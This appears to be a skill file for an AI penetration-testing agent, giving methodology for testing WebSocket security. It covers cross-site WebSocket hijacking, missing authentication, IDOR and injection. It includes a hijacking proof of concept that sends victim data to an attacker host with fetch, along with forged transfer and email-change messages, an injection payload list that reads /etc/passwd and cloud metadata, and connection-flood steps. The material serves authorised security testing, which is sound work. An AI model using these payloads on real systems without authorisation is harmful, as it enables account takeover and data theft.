---
name: websocket_security
description: WebSocket security testing covering CSWSH, authentication bypass, message injection, IDOR over WebSocket, and protocol-level attacks
---

# WebSocket Security

WebSocket connections establish persistent, bidirectional channels that often bypass the security controls applied to REST endpoints. Authentication tokens passed in the initial HTTP upgrade handshake are frequently not re-validated for the lifetime of the connection. Message-level authorization is often entirely absent.

## Attack Surface

**Where WebSockets Appear**
- Real-time chat and notification systems
- Live dashboards and data feeds (trading, analytics, monitoring)
- Collaborative editing tools
- Online games and interactive applications
- GraphQL subscriptions
- Live customer support widgets
- DevTools / debug panels (often unauthenticated)

**Discovery Methods**
- JavaScript source analysis: search for `new WebSocket(`, `io.connect(`, `socket.io`, `sockjs`
- Caido proxy WebSocket tab (automatically captures WS frames)
- `katana -js-crawl` to spider JavaScript and find WS endpoint patterns
- Browser DevTools → Network → WS tab while navigating the application

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket handshake is an HTTP request. If the server does not validate the `Origin` header, any website can establish a WebSocket connection to the target using the victim's cookies.

**Detection**: Send upgrade request with a different `Origin` header:
```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.attacker.com
Sec-WebSocket-Key: <base64>
```
If the server returns `101 Switching Protocols` → CSWSH is possible.

**PoC** (run via browser `execute_js` action on a malicious page):
```javascript
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send(JSON.stringify({action: 'get_user_data'}));
ws.onmessage = e => fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
```

### Authentication Not Enforced on Upgrade

Many applications authenticate REST endpoints but forget the WebSocket upgrade path. Test:
```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64>
// No Cookie or Authorization header
```
If the server returns `101` → unauthenticated WebSocket access.

### Authorization Bypass on Messages (IDOR over WebSocket)

Even when the WS connection requires authentication, individual message actions may not enforce authorization. Test:
1. Connect as User A, subscribe to your own resource: `{"subscribe": "room/user_A_id"}`
2. Send the same subscription as User A but targeting User B's resource: `{"subscribe": "room/user_B_id"}`
3. If you receive User B's messages → IDOR over WebSocket

Also test:
```json
{"action": "read_messages", "userId": 1}    ← your ID
{"action": "read_messages", "userId": 2}    ← another user's ID
```

### Message Injection

WebSocket messages that carry commands or data are often not CSRF-protected. Any page that can establish a WS connection (via CSWSH) can send arbitrary messages:
```javascript
ws.send(JSON.stringify({action: 'transfer', to: 'attacker', amount: 1000}));
ws.send(JSON.stringify({action: 'change_email', email: 'attacker@evil.com'}));
```

### Injection via WebSocket Messages

WebSocket messages are often forwarded to backend services without sanitization. Test:
```json
{"query": "' OR '1'='1"}           ← SQL injection
{"template": "{{7*7}}"}             ← SSTI
{"command": "; id"}                 ← command injection
{"path": "../../etc/passwd"}        ← path traversal
{"url": "http://169.254.169.254/"}  ← SSRF
```

### Denial of Service

Test for rate limiting on:
- Connection rate (open 1000 connections rapidly)
- Message rate (send 10,000 messages per second)
- Large message payloads (send multi-MB messages)

## Bypass Techniques

**Origin Header Spoofing Limitation**
Browsers enforce the `Origin` header — it cannot be set to arbitrary values by JavaScript running on a web page. However:
- `null` origin (from sandboxed iframe/data URI) may be trusted
- Native WebSocket clients (Python `websockets`, `wscat`) can set any `Origin`

**Null Origin for WS**
```python
import websockets, asyncio
async def exploit():
    async with websockets.connect('wss://target.com/ws', extra_headers={'Origin': 'null'}) as ws:
        await ws.send('{"action": "get_data"}')
        print(await ws.recv())
asyncio.run(exploit())
```

**Token in URL (Logged)**
If the WS endpoint authenticates via URL token (`wss://target.com/ws?token=xxx`), the token appears in server logs and may be accessible to other agents/processes.

## Tools

- **Python `websockets` library** — Full WS client for automated testing:
  ```python
  import websockets, asyncio, json
  async def test():
      async with websockets.connect('wss://target.com/ws') as ws:
          await ws.send(json.dumps({"action": "test"}))
          print(await ws.recv())
  asyncio.run(test())
  ```
- **wscat** (npm) — Interactive WS CLI: `npx wscat -c wss://target.com/ws`
- **Caido** — Automatically captures and displays WS frames; supports sending custom frames
- **Browser `execute_js` action** — Establish WS connections from within the browser context (includes session cookies automatically)
- **nuclei** — WS templates: `nuclei -t nuclei-templates/network/websocket*`

## Testing Methodology

1. Discover all WebSocket endpoints via JS source grep, Caido proxy, and browser DevTools
2. Test CSWSH: replay the WebSocket upgrade request with `Origin: https://evil.attacker.com` — if 101 returned → vulnerable
3. Test authentication: replay upgrade without `Cookie`/`Authorization` headers — if 101 returned → unauthenticated access
4. Connect as authenticated user; enumerate all message types by intercepting normal application traffic in Caido
5. Test IDOR on each subscription/data-fetch message type by substituting other user IDs or resource identifiers
6. Test injection: send SQL, SSTI, command injection payloads in string message fields
7. Test for rate limiting by sending messages in rapid succession
8. For CSWSH-vulnerable endpoints: run PoC via browser `execute_js` with `credentials: 'include'` equivalent (WS uses cookies automatically in browser context)
9. Document: endpoint URL, vulnerability type, message payload, and data exposed

## Pro Tips

- GraphQL subscriptions over WebSocket are a goldmine for IDOR — each subscription channel often maps to a user resource without proper authorization checks
- The WS upgrade request looks just like an HTTP request — use Caido to intercept it and modify the `Origin` header before the connection is established
- Many debugging WebSocket endpoints (e.g., `/debug/ws`, `/__ws`, `/admin/ws`) are left open without authentication in staging environments that have been promoted to production
- `execute_js` action in the browser tool can establish WS connections that automatically carry the session cookies from the current browser session — this is the most realistic CSWSH simulation
- Always check if the server echoes back message data into the DOM or other sinks — WS is a common vector for stored XSS delivered through real-time updates
